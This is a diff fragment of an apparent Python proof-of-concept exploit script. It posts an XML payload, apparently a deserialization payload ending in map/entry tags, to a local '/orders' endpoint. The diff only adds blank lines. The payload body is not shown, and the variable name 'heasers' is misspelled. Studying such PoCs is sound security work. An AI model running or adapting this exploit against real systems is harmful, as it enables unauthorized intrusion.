@@ -18,9 +18,12 @@ data = '''
 </entry> 
 </map>
 '''
+
+
 def poc(url):
     res = requests.post(url, headers=heasers, data=data)
     print res.content
+
 
 if __name__ == '__main__':
     url = 'http://127.0.0.1:8084/orders'
